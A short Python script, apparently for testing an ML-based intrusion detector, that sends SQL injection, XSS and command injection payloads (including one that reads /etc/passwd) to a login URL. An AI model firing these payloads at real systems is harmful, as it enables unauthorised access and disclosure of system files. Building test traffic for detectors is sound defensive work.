import requests
import argparse

# Malicious Payload Attack Script
# Sends SQL injection and XSS payloads to test ML model detection
# Usage: python malicious_payload.py --url http://<your-server-ip>/login

def malicious_payload_attack(url):
    payloads = [
        {"username": "admin' OR '1'='1", "password": "test"},  # SQL Injection
        {"username": "<script>alert('Hacked')</script>", "password": "test"},  # XSS
        {"username": ";cat /etc/passwd", "password": "test"},  # Command Injection
    ]
    for payload in payloads:
        try:
            headers = {"Content-Type": "application/x-www-form-urlencoded"}
            response = requests.post(url, data=payload, headers=headers, timeout=5)
            print(f"Sent payload {payload}, Status: {response.status_code}")
        except requests.RequestException as e:
            print(f"Error sending payload {payload}: {e}")

def main():
    parser = argparse.ArgumentParser(description="Malicious Payload Attack Simulator")
    parser.add_argument("--url", required=True, help="Target URL (e.g., http://<your-server-ip>/login)")
    args = parser.parse_args()

    print(f"Starting Malicious Payload attack on {args.url}...")
    malicious_payload_attack(args.url)
    print("Attack completed.")

if __name__ == "__main__":
    main()